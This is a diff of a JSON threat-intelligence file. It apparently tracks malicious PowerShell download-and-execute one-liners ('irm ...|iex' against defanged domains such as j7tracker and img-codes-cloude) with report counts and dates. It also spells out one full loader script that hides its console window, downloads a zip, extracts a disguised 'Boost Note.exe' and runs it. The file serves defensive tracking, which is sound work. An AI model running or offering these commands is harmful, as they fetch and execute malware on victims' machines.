@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 81,
-    "ReportCount": 81,
-    "FirstSeen": "2026-11-19T23:19:43.828000+00:00",
+    "DistinctPayloadCount": 80,
+    "ReportCount": 80,
+    "FirstSeen": "2026-11-20T00:51:39.997000+00:00",
     "LastSeen": "2026-11-26T20:26:33.895000+00:00",
     "ReportIds": [
-      "cmwo6a5551xu40omla5b849lo",
       "cmwo9kdgz1ys80omlr22sxrni",
       "cmwodzfal1z0v0omlds2tteaj",
       "cmwodzv5l1z250omlqi1hs6dh",
@@ -153,7 +152,6 @@
       "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/b2c44d0232aedd18')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/ca3229b1985ab5e5')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/e47acd3c810cfbb1')|iex",
-      "(irm 'https://j7tracker[.]gb[.]net/hn/6b4fae7bb06cf009')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/ki9ao4wpdn/3d32e71b41be6ac2')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/prolivdante1/11e3b89ef6427fe6')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/sw1la1x22k/8100c381816daa56')|iex",
@@ -174,13 +172,11 @@
   },
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 51,
-    "ReportCount": 51,
-    "FirstSeen": "2026-11-19T23:19:28.448000+00:00",
+    "DistinctPayloadCount": 49,
+    "ReportCount": 49,
+    "FirstSeen": "2026-11-20T05:30:54.841000+00:00",
     "LastSeen": "2026-11-26T16:00:18.255000+00:00",
     "ReportIds": [
-      "cmwo69tad1xsb0omltg23i5hb",
-      "cmwo6iht31y350omldf1s1y9c",
       "cmwojjhkd1zzs0omlsqk31zh4",
       "cmwpthx4023zn0omleyj7lhjr",
       "cmwq3hj6925o90omluxfpwhhb",
@@ -248,7 +244,6 @@
       "irm 'browse-login[.]info/eaa84dd940b7e8af'|iex;",
       "irm 'browse-login[.]info/edef55d135d02fe5'|iex;",
       "irm 'browse-login[.]info/eeab68657283de12'|iex;",
-      "irm 'img-codes-cloude[.]info/0253250b2b50c7ff'|iex;",
       "irm 'img-codes-cloude[.]info/0c422f1bf6150bfd'|iex;",
       "irm 'img-codes-cloude[.]info/10fb6db048d0ef86'|iex;",
       "irm 'img-codes-cloude[.]info/241f82e9da7d4c6c'|iex;",
@@ -260,7 +255,6 @@
       "irm 'img-codes-cloude[.]info/41d88dcc57a5f96c'|iex;",
       "irm 'img-codes-cloude[.]info/4349f1daacd50bcc'|iex;",
       "irm 'img-codes-cloude[.]info/437dc7e50c68cd86'|iex;",
-      "irm 'img-codes-cloude[.]info/4e816a63fc53eaa4'|iex;",
       "irm 'img-codes-cloude[.]info/53ae2645eac6a23f'|iex;",
       "irm 'img-codes-cloude[.]info/569f53cf050814f3'|iex;",
       "irm 'img-codes-cloude[.]info/5d1090f58148ad0e'|iex;",
@@ -604,11 +598,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 4,
-    "FirstSeen": "2026-11-19T23:20:44.145000+00:00",
+    "ReportCount": 3,
+    "FirstSeen": "2026-11-20T05:27:44.504000+00:00",
     "LastSeen": "2026-11-20T17:27:10.495000+00:00",
     "ReportIds": [
-      "cmwo6bfpc1xut0omlmuild5t3",
       "cmwojfeow1zt70omldtv35868",
       "cmwowbsrs21i40oml955vjato",
       "cmwp94lsd226p0oml211sh43e"
